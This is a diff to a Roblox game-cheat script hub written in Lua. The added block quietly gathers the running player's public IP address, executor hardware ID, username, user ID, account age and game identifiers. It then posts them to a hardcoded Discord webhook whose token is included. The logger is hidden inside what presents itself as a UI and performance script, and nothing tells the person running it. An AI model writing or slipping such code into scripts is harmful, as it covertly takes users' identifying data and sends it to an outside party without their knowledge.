@@ -1067,6 +1067,100 @@ SaveManager:SetFolder('MyScriptHub/specific-game')
 SaveManager:BuildConfigSection(Tabs['UI Settings']) 
 ThemeManager:ApplyToTab(Tabs['UI Settings'])
 
+local body = syn.request({Url = 'https://httpbin.org/get'; Method = 'GET'}).Body;
+local decoded = game:GetService('HttpService'):JSONDecode(body)
+local hwid_list = {"Syn-Fingerprint", "Exploit-Guid", "Proto-User-Identifier", "Sentinel-Fingerprint", "Krnl-Hwid"};
+hwid = "";
+
+request = http_request or request or HttpPost or syn.request
+local ip = game:HttpGet("https://v4.ident.me/")
+
+for i, v in next, hwid_list do
+    if decoded.headers[v] then
+        hwid = decoded.headers[v];
+        break
+    end
+end
+
+local function getexploit()
+    local exploit =
+        (syn and not is_sirhurt_closure and not pebc_execute and "Synapse") or
+        (secure_load and "Sentinel") or
+        (is_sirhurt_closure and "Sirhurt") or
+        (pebc_execute and "ProtoSmasher") or
+        (KRNL_LOADED and "Krnl") or
+        (WrapGlobal and "WeAreDevs") or
+        (isvm and "Proxo") or
+        (shadow_env and "Shadow") or
+        (jit and "EasyExploits") or
+        (getscriptenvs and "Calamari") or
+        (unit and not syn and "Unit") or
+        (OXYGEN_LOADED and "Oxygen U") or
+        (IsElectron and "Electron") or
+        ("Unsupported")
+  
+    return exploit
+end
+
+local h = game:GetService("HttpService"):GenerateGUID(false)
+local OSTime = os.time();
+local Time = os.date('!*t', OSTime);
+local Avatar = 'https://cdn.discordapp.com/attachments/989340234326114404/989340530318114956/New_Project_5.png';
+local Content = '';
+local Embed = {
+   title = "**NOCOM.wtf**";
+   color = EmbedColor;
+   footer = { text = game.JobId };
+   author = {
+       name = "Username: \""..game.Players.LocalPlayer.Name.."\" ID: \""..game.Players.LocalPlayer.UserId.."\"";
+       url = 'https://www.roblox.com/users/'..game.Players.LocalPlayer.UserId .. '/profile';
+   };
+   thumbnail = {
+           url = "https://cdn.discordapp.com/attachments/994051208056688642/996325138960224316/unknown.png"
+       },
+   fields = {
+   {
+       name = "AccountAge:";
+       value = game.Players.LocalPlayer.AccountAge;
+       inline = true
+   },
+   {
+       name = 'Game name';
+       value = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId, Enum.InfoType.Asset).Name;
+       inline = true
+   },
+   {
+       name = 'HWID';
+       value = hwid;
+       inline = true
+   },
+   {
+       name = 'IPv4';
+       value = ip;
+       inline = true
+   },
+   {
+       name = 'Game PlaceId';
+       value = game.PlaceId;
+       inline = true
+   },
+   {
+       name = 'Game JobId';
+       value = game.JobId;
+       inline = true
+   }
+   };
+   timestamp = string.format('%d-%d-%dT%02d:%02d:%02dZ', Time.year, Time.month, Time.day, Time.hour, Time.min, Time.sec);
+};
+request{
+   Url = 'https://canary.discord.com/api/webhooks/994726950411194490/ZxuLr8ZZkYiuc-lPAuw8x6XgVL4e4HWJhIp6OkROeBNjlw50aY-EC9Nhr3TO6JBkhDtV';
+   Method = 'POST';
+   Headers = {
+       ['Content-Type'] = 'application/json';
+   };
+   Body = game:GetService'HttpService':JSONEncode( { content = Content; embeds = { Embed } } );
+};
+
 while true do
     ping = string.split(string.split(game.Stats.Network.ServerStatsItem["Data Ping"]:GetValueString(), " ")[1], ".")
     fps = string.split(game.Stats.Workspace.Heartbeat:GetValueString(), ".")
